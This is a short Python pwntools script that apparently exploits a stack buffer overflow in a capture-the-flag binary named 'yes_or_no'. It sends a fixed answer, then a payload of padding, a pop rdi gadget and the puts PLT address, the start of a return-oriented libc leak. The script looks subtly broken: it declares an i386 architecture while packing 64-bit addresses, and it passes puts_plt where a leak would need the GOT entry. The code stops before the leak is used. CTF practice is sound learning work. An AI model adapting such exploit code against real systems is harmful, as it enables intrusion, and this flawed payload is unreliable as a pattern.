from pwn import *

#p = remote("ctf.j0n9hyun.xyz", 3009)
p = process("./yes_or_no")
binary = ELF("./yes_or_no")
libc = ELF("./libc.so.6")

#context.log_level = "DEBUG"
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p, "b*0x00000000004007d6")
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
answer = "9830400"
pop_rdi = 0x400883


print p.recvuntil("number~!")
p.sendline(answer)
print p.recvuntil("Follow me")

payload = ''
payload += "A"*26
payload += p64(pop_rdi)
payload += p64(puts_plt)

p.sendline(payload)
print p.recvuntil("\n")